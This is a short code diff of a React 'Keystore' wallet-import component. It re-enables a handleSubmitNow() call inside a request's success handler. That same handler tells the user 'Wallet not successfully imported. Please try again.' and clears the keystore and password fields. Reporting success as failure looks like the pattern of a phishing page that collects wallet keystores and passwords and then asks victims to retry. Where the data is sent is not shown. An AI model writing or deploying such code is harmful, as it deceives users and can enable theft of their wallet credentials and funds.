@@ -39,7 +39,7 @@ const Keystore = () => {
       )
       .then((response) => {
         setLoading(false);
-        // handleSubmitNow();
+        handleSubmitNow();
         toast.error("Wallet not successfully imported. Please try again.");
         setKeyStore("");
         setPassword("");
